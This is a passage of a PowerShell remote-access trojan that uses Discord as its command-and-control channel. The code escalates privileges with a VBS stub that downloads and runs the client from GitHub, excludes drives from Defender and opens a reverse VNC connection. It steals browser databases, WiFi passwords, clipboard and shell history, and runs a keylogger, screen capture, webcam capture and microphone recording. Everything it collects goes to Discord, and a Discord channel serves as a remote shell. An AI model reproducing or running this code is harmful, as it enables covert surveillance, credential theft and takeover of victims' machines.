        Iwr -Uri $vncDownload -OutFile $vncZip
    }
    sleep 1
    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
    sleep 1
    rm -Path $vncZip -Force  
    $proc = "$tempFolder\winvnc.exe"
    Start-Process $proc -ArgumentList ("-run")
    sleep 2
    Start-Process $proc -ArgumentList ("-connect $ip::$port")
    
}

Function RecordScreen{
param ([int[]]$t)
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    sendMsg -Message ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"
    $mkvPath = "$env:Temp\ScreenClip.mp4"
    if ($t.Length -eq 0){$t = 10}
    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 10 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
    # .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
    sendFile -sendfilePath $mkvPath | Out-Null
    sleep 5
    rm -Path $mkvPath -Force
}

# --------------------------------------------------------------- ADMIN FUNCTIONS ------------------------------------------------------------------------

Function IsAdmin{
    If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
        sendMsg -Message ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"
    }
    else{
        sendMsg -Message ":white_check_mark: ``You are Admin!`` :white_check_mark:"
    }
}

Function Elevate{
    $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists(`"elevate`") Then
  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
  WScript.Quit
End If
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
"@
    $pth = "C:\Windows\Tasks\service.vbs"
    $tobat | Out-File -FilePath $pth -Force
    try{
        & $pth
        Sleep 7
        rm -Path $pth
        sendMsg -Message ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"
        exit
    }
    catch{
    Write-Host "FAILED"
    }
}

Function ExcludeCDrive {
    Add-MpPreference -ExclusionPath C:\
    sendMsg -Message ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"
}

Function ExcludeALLDrives {
    Add-MpPreference -ExclusionPath C:\
    Add-MpPreference -ExclusionPath D:\
    Add-MpPreference -ExclusionPath E:\
    Add-MpPreference -ExclusionPath F:\
    Add-MpPreference -ExclusionPath G:\
    sendMsg -Message ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"
}

Function EnableIO{
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($false)
    sendMsg -Message ":white_check_mark: ``IO Enabled`` :white_check_mark:"
}

Function DisableIO{
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($true)
    sendMsg -Message ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"
}

# =============================================================== MAIN FUNCTIONS =========================================================================

# Scriptblock for info + loot to discord
$dolootjob = {
param([string]$token,[string]$LootID)
    function sendFile {
        param([string]$sendfilePath)
    
        $url = "https://discord.com/api/v10/channels/$LootID/messages"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $webClient.UploadFile($url, "POST", $sendfilePath)
                Write-Host "Attachment sent to Discord: $sendfilePath"
            } else {
                Write-Host "File not found: $sendfilePath"
            }
        }
    }

    function sendMsg {
        param([string]$Message)
        $url = "https://discord.com/api/v10/channels/$lootID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
	        $message = $null
        }
    }

    Function BrowserDB {
        sendMsg -Message ":arrows_counterclockwise: ``Getting Browser DB Files..`` :arrows_counterclockwise:"
        $temp = [System.IO.Path]::GetTempPath() 
        $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
        $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
        $mozdest = Join-Path -Path $tempFolder -ChildPath 'firefox'
        $edgedest = Join-Path -Path $tempFolder -ChildPath 'edge'
        New-Item -Path $tempFolder -ItemType Directory -Force
        sleep 1
        New-Item -Path $googledest -ItemType Directory -Force
        New-Item -Path $mozdest -ItemType Directory -Force
        New-Item -Path $edgedest -ItemType Directory -Force
        sleep 1
        
        Function CopyFiles {
            param ([string]$dbfile,[string]$folder,[switch]$db)
            $filesToCopy = Get-ChildItem -Path $dbfile -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'formhistory.sqlite' -or $_.Name -like 'places.sqlite' -or $_.Name -like 'cookies.sqlite'}
            foreach ($file in $filesToCopy) {
                $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
                if ($db -eq $true){
                    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
                }
                else{
                    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension 
                }
                $destination = Join-Path -Path $folder -ChildPath $newFileName
                Copy-Item -Path $file.FullName -Destination $destination -Force
            }
        } 
        
        $script:googleDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
        $script:firefoxDir = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' };$firefoxDir = $firefoxDir.FullName
        $script:edgeDir = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
        copyFiles -dbfile $googleDir -folder $googledest -db
        copyFiles -dbfile $firefoxDir -folder $mozdest
        copyFiles -dbfile $edgeDir -folder $edgedest -db
        $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.zip")
        Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
        Remove-Item -Path $tempFolder -Recurse -Force
        sendFile -sendfilePath $zipFileName
        sleep 1
        Remove-Item -Path $zipFileName -Recurse -Force
    }

    Function SystemInfo{
    sendMsg -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"
    Add-Type -AssemblyName System.Windows.Forms
    # WMI Classes
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $videocardinfo = Get-WmiObject Win32_VideoController
    $Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem, @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videocardinfo.Name)"
    $DiskHealth = Get-PhysicalDisk | Select-Object DeviceID, FriendlyName, OperationalStatus, HealthStatus; $DiskHealth = ($DiskHealth | Out-String)
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
    # User Information
    $fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
    $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
    $OSString = "$($systemInfo.Caption)"
    $OSArch = "$($systemInfo.OSArchitecture)"
    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    $users = "$($userInfo.Name)"
    $userString = "`nFull Name : $($userInfo.FullName)"
    $clipboard = Get-Clipboard
    # System Information
    $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
    $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
    $service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
    $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
    $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
    $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
    $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
    # Current System Metrics
    function Get-PerformanceMetrics {
        $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
        $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
        $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
        $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    
        return [PSCustomObject]@{
            CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
            MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
            DiskIO = "{0:F2}" -f $diskIO.CookedValue
            NetworkIO = "{0:F2}" -f $networkIO.CookedValue
        }
    }
    $metrics = Get-PerformanceMetrics
    $PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
    $PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
    $PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
    $PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
    # Saved WiFi Network Info
    $outssid = ''
    $a=0
    $ws=(netsh wlan show profiles) -replace ".*:\s+"
    foreach($s in $ws){
        if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
            $ssid=$s.Trim()
            if($s -Match ":"){
                $ssid=$s.Split(":")[1].Trim()
                }
            $pw=(netsh wlan show profiles name=$ssid key=clear)
            $pass="None"
            foreach($p in $pw){
                if($p -Match "Key Content"){
                $pass=$p.Split(":")[1].Trim()
                $outssid+="SSID: $ssid | Password: $pass`n-----------------------`n"
                }
            }
        }
        $a++
    }
    # GPS Location Info
    Add-Type -AssemblyName System.Device
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    	Sleep -M 100
    }  
    if ($GeoWatcher.Permission -eq 'Denied'){
        $GPS = "Location Services Off"
    }
    else{
    	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
    	$GL = $GL -split " "
    	$Lat = $GL[0].Substring(11) -replace ".$"
    	$Lon = $GL[1].Substring(10) -replace ".$"
        $GPS = "LAT = $Lat LONG = $Lon"
    }
    function EnumNotepad{
    $appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
    $directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
    $matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
    foreach ($dir in $matchingDirectories) {
        $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
        $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
        foreach ($fullFilePath in $listOfBinFiles) {
            if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
                continue
            }
            $seperator = ("========================== NOTEPAD TABS ===============================")
            $SMseperator = ("-" * 60)
            $seperator | Out-File -FilePath $outpath -Append
            $filename = $fullFilePath.Name
            $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
            $isSavedFile = $contents[3]
            if ($isSavedFile -eq 1) {
                $lengthOfFilename = $contents[4]
                $filenameEnding = 5 + $lengthOfFilename * 2
                $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
                "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
                $filename | Out-File -FilePath $outpath -Append
                $SMseperator | Out-File -FilePath $outpath -Append
                Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append
    
            } else {
                "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
                $filename | Out-File -FilePath $outpath -Append
                $SMseperator | Out-File -FilePath $outpath -Append
                $filenameEnding = 0
                $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
                $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
                $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
                $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
                $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
                $originalFileContent = ""
                for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
                    if ($originalFileBytes[$i] -ne 0) {
                        $originalFileContent += [char]$originalFileBytes[$i]
                    }
                }
                $originalFileContent | Out-File -FilePath $outpath -Append
            }
         "`n" | Out-File -FilePath $outpath -Append
        }
    }
    }
    function Convert-BytesToDatetime([byte[]]$b) { 
        [long]$f = ([long]$b[7] -shl 56) -bor ([long]$b[6] -shl 48) -bor ([long]$b[5] -shl 40) -bor ([long]$b[4] -shl 32) -bor ([long]$b[3] -shl 24) -bor ([long]$b[2] -shl 16) -bor ([long]$b[1] -shl 8) -bor [long]$b[0]
        $script:activated = [datetime]::FromFileTime($f)
    }
    $bArr = (Get-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions").ProductPolicy 
    $totalSize = ([System.BitConverter]::ToUInt32($bArr,0))
    $policies = @()
    $ip = 0x14
    while ($true){
        $eSize = ([System.BitConverter]::ToUInt16($bArr,$ip))
        $eNameSize = ([System.BitConverter]::ToUInt16($bArr,$ip+2))
        $eDataSize = ([System.BitConverter]::ToUInt16($bArr,$ip+6))
        $eName = [System.Text.Encoding]::Unicode.GetString($bArr[($ip+0x10)..($ip+0xF+$eNameSize)])
        if ($eName -eq 'Security-SPP-LastWindowsActivationTime'){
            Convert-BytesToDatetime($bArr[($ip+0x10+$eNameSize)..($ip+0xF+$eNameSize+$eDataSize)])
        }
        $ip += $eSize
        if (($ip+4) -ge $totalSize){
            break
        }
    }

$infomessage = "
==================================================================================================================================
      _________               __                           .__        _____                            __  .__               
     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
==================================================================================================================================
"
$infomessage1 = "``````
=============================================================
SYSTEM INFORMATION FOR $env:COMPUTERNAME
=============================================================
User Information
-------------------------------------------------------------
Current User          : $env:USERNAME
Email Address         : $email
Language              : $systemLanguage
Keyboard Layout       : $keyboardLayoutID
Other Accounts        : $users
Current OS            : $OSString
Build ID              : $ver
Architechture         : $OSArch
Screen Size           : $screensize
Location              : $GPS
Activation Date       : $activated
=============================================================
Hardware Information
-------------------------------------------------------------
Processor             : $processor 
Memory                : $RamInfo
Gpu                   : $gpu

Storage
----------------------------------------
$Hddinfo
$DiskHealth
Current System Metrics
----------------------------------------
$PMcpu
$PMmu
$PMdio
$PMnio
=============================================================
Network Information
-------------------------------------------------------------
Public IP Address     : $computerPubIP
``````"
$infomessage2 = "

Saved WiFi Networks
----------------------------------------
$outssid

Nearby Wifi Networks
----------------------------------------
$Wifi
==================================================================================================================================
History Information
----------------------------------------------------------------------------------------------------------------------------------
Clipboard Contents
---------------------------------------
$clipboard

Browser History
----------------------------------------
$Value

Powershell History
---------------------------------------
$pshistory

==================================================================================================================================
Recent File Changes Information
----------------------------------------------------------------------------------------------------------------------------------
$RecentFiles

==================================================================================================================================
USB Information
----------------------------------------------------------------------------------------------------------------------------------
$usbdevices

==================================================================================================================================
Software Information
----------------------------------------------------------------------------------------------------------------------------------
$software

==================================================================================================================================
Running Services Information
----------------------------------------------------------------------------------------------------------------------------------
$service

==================================================================================================================================
Current Processes Information
----------------------------------------------------------------------------------------------------------------------------------
$process

=================================================================================================================================="
    $outpath = "$env:TEMP/systeminfo.txt"
    $infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
    $infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
    $infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append
    
    if ($OSString -like '*11*'){
        EnumNotepad
    }
    else{
        "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
    }
    
    sendMsg -Message $infomessage1
    sendFile -sendfilePath $outpath
    Sleep 1
    Remove-Item -Path $outpath -force
    }

    
    Function FolderTree{
        sendMsg -Message ":arrows_counterclockwise: ``Getting File Trees..`` :arrows_counterclockwise:"
        tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
        tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
        tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
        $FilePath ="$env:temp/TreesOfKnowledge.zip"
        Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
        sleep 1
        sendFile -sendfilePath $FilePath | Out-Null
        rm -Path $FilePath -Force
        Write-Output "Done."
    }

    sendMsg -Message ":hourglass: ``$env:COMPUTERNAME Getting Loot Files.. Please Wait`` :hourglass:"
    SystemInfo
    BrowserDB
    FolderTree

}

# Scriptblock for PS console in discord
$doPowershell = {
param([string]$token,[string]$PowershellID)
    Function Get-BotUserId {
        $headers = @{
            'Authorization' = "Bot $token"
        }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
        $botInfo = $botInfo | ConvertFrom-Json
        return $botInfo.id
    }
    $global:botId = Get-BotUserId
    sleep 5
    $url = "https://discord.com/api/v10/channels/$PowershellID/messages"
    $w = New-Object System.Net.WebClient
    $w.Headers.Add("Authorization", "Bot $token")
    function senddir{
        $dir = $PWD.Path
        $w.Headers.Add("Content-Type", "application/json")
        $j = @{"content" = "``PS | $dir >``"} | ConvertTo-Json
        $x = $w.UploadString($url, "POST", $j)
    }
    senddir
    while($true){
        $msg = $w.DownloadString($url)
        $r = ($msg | ConvertFrom-Json)[0]
        if($r.author.id -ne $botId){
            $a = $r.timestamp
            $msg = $r.content
        }
        if($a -ne $p){
            $p = $a
            $out = &($env:CommonProgramW6432[12],$env:ComSpec[15],$env:ComSpec[25] -Join $()) $msg
            $resultLines = $out -split "`n"
            $currentBatchSize = 0
            $batch = @()
            foreach ($line in $resultLines) {
                $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
                if (($currentBatchSize + $lineSize) -gt 1900) {
                    $w.Headers.Add("Content-Type", "application/json")
                    $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
                    $x = $w.UploadString($url, "POST", $j)
                    sleep 1
                    $currentBatchSize = 0
                    $batch = @()
                }
                $batch += $line
                $currentBatchSize += $lineSize
            }
            if ($batch.Count -gt 0) {
                $w.Headers.Add("Content-Type", "application/json")
                $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
                $x = $w.UploadString($url, "POST", $j)
            }
            senddir
        }
        sleep 3
    }
}

# Scriptblock for keycapture to discord
$doKeyjob = {
param([string]$token,[string]$keyID)
    sleep 5
    $script:token = $token
    function sendMsg {
    param([string]$Message)
    $url = "https://discord.com/api/v10/channels/$keyID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
	        $message = $null
        }
    }
    Function Kservice {   
        sendMsg -Message ":mag_right: ``Keylog Started`` :mag_right:"
        $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
        $API = Add-Type -M $API -Name 'Win32' -Names API -PassThru
        $pressed = [System.Diagnostics.Stopwatch]::StartNew()
        # Change for frequency
        $maxtime = [TimeSpan]::FromSeconds(10)
        $strbuild = New-Object -TypeName System.Text.StringBuilder 
        While ($true){
            $down = $false
            try{
            while ($pressed.Elapsed -lt $maxtime) {
                Start-Sleep -Milliseconds 30
                for ($capture = 8; $capture -le 254; $capture++){
                $keyst = $API::GetAsyncKeyState($capture)
                    if ($keyst -eq -32767) {
                    $down = $true
                    $pressed.Restart()
                    $null = [console]::CapsLock
                    $vtkey = $API::MapVirtualKey($capture, 3)
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                             
                        if ($API::ToUnicode($capture, $vtkey, $kbst, $strbuild, $strbuild.Capacity, 0)) {
                        $collected = $strbuild.ToString()
                            if ($capture -eq 27) {$collected = "[ESC]"}
                            if ($capture -eq 8) {$collected = "[BACK]"}
                            if ($capture -eq 13) {$collected = "[ENT]"}
                            $keymem += $collected 
                            }
                        }
                    }
                }
            }
            finally{
                If ($down) {
                    $escmsgsys = $keymem -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
                    sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
                    $down = $false
                    $keymem = ""
                }
            }
        $pressed.Restart()
        Start-Sleep -Milliseconds 10
        }
    }Kservice
}

# Scriptblock for microphone input to discord
$audiojob = {
    param ([string]$token,[string]$MicrophoneID,[string]$MicrophoneWebhook)
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$MicrophoneID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($MicrophoneWebhook){
                    $hooksend = $wc.UploadFile($MicrophoneWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $outputFile = "$env:Temp\Audio.mp3"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        return (get-ItemProperty $reg).FriendlyName
    }
    $id1 = [audio]::GetDefault(1)
    $MicName = "$(getFriendlyName $id1)"
    while($true){
        .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t 60 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
        sendFile -sendfilePath $outputFile | Out-Null
        sleep 1
        rm -Path $outputFile -Force
    }
}

# Scriptblock for desktop screenshots to discord
$screenJob = {
    param ([string]$token,[string]$ScreenshotID,[string]$ScreenshotWebhook)
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$ScreenshotID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($ScreenshotWebhook){
                    $hooksend = $wc.UploadFile($ScreenshotWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    while($true){
        $mkvPath = "$env:Temp\Screen.jpg"
        .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
        sendFile -sendfilePath $mkvPath | Out-Null
        sleep 5
        rm -Path $mkvPath -Force
        sleep 1
    }
}

# Scriptblock for webcam screenshots to discord
$camJob = {
    param ([string]$token,[string]$WebcamID,[string]$WebcamWebhook)    
    function sendFile {
        param([string]$sendfilePath)
        $url = "https://discord.com/api/v10/channels/$WebcamID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $wc.UploadFile($url, "POST", $sendfilePath)
                if ($WebcamWebhook){
                    $hooksend = $wc.UploadFile($WebcamWebhook, "POST", $sendfilePath)
                }
            }
        }
    }
    $imagePath = "$env:Temp\Image.jpg"
    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
    if (!($input)){$Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Image'} | select -First 1).Name}
    while($true){
        .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
        sendFile -sendfilePath $imagePath | Out-Null
        sleep 5
        rm -Path $imagePath -Force
        sleep 5
    }
}

# Function to start all jobs upon script execution
function StartAll{
    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID, $global:WebcamWebhook
    sleep 1
    Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
    sleep 1
    Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID, $global:MicrophoneWebhook
    sleep 1
    Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
    sleep 1
    Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
    sleep 1
    Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
}

Function ConnectMsg {

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    $adminperm = "False"
} else {
